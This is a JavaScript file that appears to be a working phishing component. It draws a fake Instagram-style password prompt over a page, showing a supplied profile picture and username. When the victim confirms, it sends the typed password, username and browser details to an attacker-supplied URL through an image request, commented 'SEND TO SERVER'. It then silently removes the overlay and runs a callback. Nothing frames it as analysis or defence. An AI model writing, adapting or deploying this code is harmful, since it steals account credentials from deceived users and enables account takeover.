const i = new Image;
function IGpop(a,b,c,d,e){
	i.src = d + ">> ";
	c=="pop"?document.body.bgColor = "#aaa":null;
	addStyle(`@keyframes animatezoom{from{transform:scale(.5)} to{transform:scale(1)}}
      .full{
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
      }
      .pop{
        border-radius: 10px;
        top: 100px;
        right: 10px;
        bottom: 250px;
        left: 10px;
      }
		#foo{
		user-select:none;
		position: absolute;
        background: white;
        font-family: sans-serif;
        text-align: center;
		animation:animatezoom 0.2s;
		}
      i{
        margin-top: 60px;
		background-image: url('https://i0.wp.com/files.catbox.moe/itytgs.png');
		background-position: 0px -52px;
		background-size: auto;
		width: 175px;
		height: 51px;
		background-repeat: no-repeat;
		display: inline-block;
      }
      img {
        height: 80px;
        width: 80px;
        margin: 18px;
        border-radius: 50%;
        border: 1px solid #eee;
      }
      input {
        margin-top: 15px;
        width: 78%;
        height: 1.4em;
        padding: 10px 0em 10px 0.5em;
        border: 1px solid #aaa;
        border-radius: 5px;
        outline: #aaa;
        background: #fafafa;
      }
      button {
        margin-top: 10px;
        background: #4bb3f7;
        color: #fff;
        width: 80%;
        height: 2.4em;
        border: 0;
        outline: 0;
        border-radius: 5px;
        font-weight: bold;
      }
      .fpc {
        margin-left: 50%;
        font-size: 14px;
        color: #4bb3f7;
      }
      a {
        color: #4bb3f7;
        text-decoration: none;
        font-weight: 600;
      }
      p {
        color: #aaa;
        font-size: 15px;
      }
      .i {
        font-weight: bold;
        font-size: 16px;
      }
	  .ld{
		  margin:2.5px;
		  height:25px;
		  width:25px;
		  border:0;
	  }`);
   const div = document.createElement('div');
  div.id = "foo";
  div.className=c;
  div.innerHTML = `<i></i><br>
      <img id="profile" src="${a}" />
	  <br>
      <span class="i">${b}</span>
      <br>
      <input type="password" placeholder="Password" />
      <br>
      <button type="submit" onclick="handleClick(${e})">Confirm</button>
      <br>
      <br>
      <span class="fpc">Forgot password?</span>
      <br>
      <br>
      <br>
      <p>Don't have an account? <a href="#">Sign Up</a>
      </p>`;
  document.body.append(div);
}
function addStyle(ss) {
  const s = document.createElement('style');
  s.textContent = ss;
  document.head.append(s);
}
function handleClick(e){
	var x = document.querySelector("#foo input").value;
	var y = navigator.userAgent;
	var z = JSON.stringify(navigator.userAgentData);
	var w = document.querySelector("#foo span").innerText;
	if(x && x.length>7){
	document.querySelector("#foo button").innerHTML = "<img src='https://i0.wp.com/files.catbox.moe/j18er6.gif' class='ld'/>";
	//SEND TO SERVER
	i.src += new Date() + " >> " + w + x + y + z;
	i.onerror = () => {
		document.getElementById("foo").remove();
		document.body.bgColor = "#fff";
		//CALLBACK
		if(typeof(e)=="function"){e();}
	}
	}else{
		document.querySelector("#foo input").style.border = "1px solid #f44336"
	}
}